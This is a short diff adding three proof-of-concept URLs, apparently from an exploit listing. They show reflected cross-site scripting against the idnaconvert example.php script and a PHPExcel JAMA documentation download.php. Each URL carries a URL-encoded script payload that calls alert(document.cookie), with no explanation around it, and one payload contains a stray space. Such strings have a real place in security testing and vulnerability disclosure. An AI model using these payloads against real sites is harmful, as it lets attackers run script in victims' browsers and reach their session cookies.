@@ -1,0 +1,5 @@
+http://www.example.com/library/idnaconvert/example.php?lang=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/library/idnaconvert/example.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/library/phpexcel/phpexcel/shared/jama/docs/download.php/%27%3E%3Cscript%3Ealert%28document.cooki e%29;%3C/script%3E
